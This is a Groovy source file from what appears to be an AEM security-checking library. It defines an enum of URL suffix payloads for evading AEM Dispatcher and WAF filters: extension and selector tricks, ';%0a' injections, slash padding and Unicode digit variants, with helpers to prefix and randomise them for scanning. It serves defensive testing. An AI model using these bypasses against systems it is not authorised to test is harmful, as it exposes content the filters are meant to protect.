/*
 * (C) Copyright 2020 Netcentric - a Cognizant Digital Business
 *
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 */
package biz.netcentric.security.checkerdsl.payload

import org.apache.commons.lang3.StringUtils

/**
 * Bypass variations for web app security filters and WAFs e.g. the AEM Dispacher
 * This lists are based on https://github.com/0ang3el/aem-hacker filter evasions talk and toolset.
 *
 * @author thomas.hartmann@netcentric.biz
 * @since 02/2019
 */
enum FilterEvasion {

    /**
     * JSON enumeration extensions + selectors to add at any random path
     */
    ENUMERATION_EXTENSIONS(Arrays.asList(
            "", ".json", ".1.json", ".-11.json", ".harray.json", ".children.json", ".tidy.json", ".infinity.json", ".4.2.1....json", ".json/a.css", ".json.html", ".json.css",
            ".json/a.html", ".json/a.png", ".json/a.ico", ".json/b.jpeg", ".json/b.gif",
            ".json;%0aa.css", ".json;%0aa.png", ".json;%0aa.html", ".json/sXz.html", ".json;%0aa.js", ".json/a.js", ".json///a.html", ".json///a.js", ".json///a.png", ".json///a.css")
    ),

    /**
     * Pre defined AEM servlet selectors and enumeration extensions.
     * This ENUM collects build in servlet selectors + extension combinations and adds a cache buster
     */
    SERVLET_ENUMERATION_WITH_BYPASS_PLACEHOLDER(Arrays.asList(
            "", ".json", ".1.json", ".4.2.1...json", ".html",
            ".languages.json", ".pages.json", ".blueprint.json", ".docview.xml", ".docview.json", ".sysview.xml", ".jcr:content.feed",
            ".{0}.css", ".{0}.js", ".{0}.png", ".{0}.ico", ".{0}.bmp", ".{0}.gif", ".{0}.html",
            ".html/{0}.1.json", ".html/{0}.4.2.1...json", ".html/{0}.css", ".html/{0}.js", ".html/{0}.png", ".html/{0}.bmp",
            ".html;%0a{0}.css", ".html;%0a{0}.js", ".children.json/{0}.ico", ".children.json?{0}.html", ".children.json?{0}.ico",
            ".json;%0a{0}.css", ".html;%0a{0}.png", ".json;%0a{0}.png", ".html;%0ADXv{0}.css",
            "xxyzkgv.html", ".tidy.-100.json",
            ".json;%0a{0}.html", ".json/{0}.css", ".json/{0}.js", ".json/{0}.png", ".json/a.gif", ".json/{0}.ico", ".json/{0}.html"
    )),

    UNICODE_CHARACTER_BYPASSES(Arrays.asList(
            "", ".json", ".١.json", ".३.২...json", ".۴.३.২...json", ".౫.३.২...json",
            ".json/١.js", ".-᭑.json"
    )),

    /**
     * Pure JSON enumeration
     */
    JSON_EVASION(Arrays.asList(
            "", ".json", ".css", ".ico", ".png", ".gif", ".html", ".js", ".json?a.css", ".json/a.1.json",
            ".json;%0aa.css", ".json;%0aa.html", ".json;%0aa.js", ".json;%0aa.png",
            ".json;%0aa.ico", ".4.2.1...json"
    )),

    /**
     * Add to complete paths to masquerade the real extension
     */
    DISPATCHER_BYPASS_EXTENSIONS(Arrays.asList(
            "", "?.ico", ".ico", "///a.ico", "/a.ico", ";%0aa.ico", "?.css", "///a.css", ".css", "/a.css", ";%0aa.css", "/.png?a", "/.map", ";%0ADXv.css", ";%0ADXv.js", ";%0ADXv.ico"
    )),

    /**
     * HTML Dispatcher bypasses
     */
    HTML_DISPATCHER_BYPASS_EXTENSIONS(Arrays.asList(
            "", ".html", ";%0a{0}.html", ".{0}.html", "/{0}.html", ".html;%0a{0}.js", ".html/{0}.1.json", ".html/{0}.1.html", ".-᭑.html", ".html/{0}.-᭑.html"
    )),

    PATH_DISPATCHER_BYPASS(Arrays.asList("///"))

    private List<String> bypasses

    private static final String CACHE_BUSTER_PLACEHOLDER = "{0}"

    FilterEvasion(final List<String> bypasses) {
        this.bypasses = bypasses
    }

    List<String> prefixBypasses(List<String> prefixes) {
        if (prefixes != null && prefixes.size() > 0) {
            // prefix if we have prefixes applied else return the bypasses without doing anything
            return this.bypasses.stream()
                    .map { extension ->
                        List extensions = []
                        prefixes.each { prefix ->
                            extensions.add(prefix + extension)
                        }

                        return extensions
                    }
                    .flatMap { list -> list.stream() }
                    .toList()
        }

        return this.bypasses
    }

    List<String> getBypasses() {
        // replace potential cachebuster placeholders
        return this.bypasses.stream()
                .map { extension ->
                    extension.replace(CACHE_BUSTER_PLACEHOLDER, StringUtils.EMPTY)
                }
                .toList()
    }

    // in prevision of checks improvements not currently in use.
    List<String> getAsList() {
        return this.bypasses.stream().toList()
    }

    List<String> getRandomizedBypasses(int cacheBusterLength) {
        String cacheBuster = Generator.cacheBuster(cacheBusterLength)

        return this.bypasses.stream()
                .map { extension ->
                    extension.replace(CACHE_BUSTER_PLACEHOLDER, cacheBuster)
                }
                .toList()
    }
}